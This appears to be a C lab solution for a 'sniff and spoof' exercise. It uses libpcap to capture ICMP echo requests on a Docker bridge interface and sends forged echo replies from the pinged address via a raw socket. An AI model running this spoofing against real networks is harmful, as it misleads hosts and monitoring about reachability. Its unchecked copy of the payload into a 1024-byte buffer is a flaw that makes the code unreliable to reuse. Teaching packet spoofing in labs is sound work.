#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    for (; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct iphdr *old_ip = (struct iphdr *)(packet + 14);
    struct icmphdr *old_icmp = (struct icmphdr *)(packet + 14 + old_ip->ihl * 4);

    if (old_icmp->type != ICMP_ECHO) return;

    int ip_header_len = old_ip->ihl * 4;
    int payload_len = ntohs(old_ip->tot_len) - ip_header_len - sizeof(struct icmphdr);
    const u_char *payload = packet + 14 + ip_header_len + sizeof(struct icmphdr);

    char buffer[1024];
    memset(buffer, 0, sizeof(buffer));

    struct iphdr *ip = (struct iphdr *)buffer;
    struct icmphdr *icmp = (struct icmphdr *)(buffer + sizeof(struct iphdr));

    ip->ihl      = 5;
    ip->version  = 4;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr    = old_ip->daddr;
    ip->daddr    = old_ip->saddr;
    ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_len);

    icmp->type              = ICMP_ECHOREPLY;
    icmp->code              = 0;
    icmp->un.echo.id        = old_icmp->un.echo.id;
    icmp->un.echo.sequence  = old_icmp->un.echo.sequence;

    memcpy(buffer + sizeof(struct iphdr) + sizeof(struct icmphdr), payload, payload_len);

    icmp->checksum = 0;
    icmp->checksum = checksum(icmp, sizeof(struct icmphdr) + payload_len);

    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = ip->daddr;

    sendto(sd, buffer, ntohs(ip->tot_len), 0,
           (struct sockaddr *)&sin, sizeof(sin));

    char src[INET_ADDRSTRLEN], dst[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &old_ip->saddr, src, sizeof(src));
    inet_ntop(AF_INET, &old_ip->daddr, dst, sizeof(dst));
    printf("Captured request: %s → %s | Spoofed reply sent!\n", src, dst);
    close(sd);
}

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter[] = "icmp and icmp[icmptype] == icmp-echo";
    bpf_u_int32 net = 0;

    handle = pcap_open_live("br-90fe1db80792", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) { fprintf(stderr, "%s\n", errbuf); return 1; }

    pcap_compile(handle, &fp, filter, 0, net);
    pcap_setfilter(handle, &fp);
    pcap_loop(handle, -1, got_packet, NULL);
    pcap_close(handle);
    return 0;
}
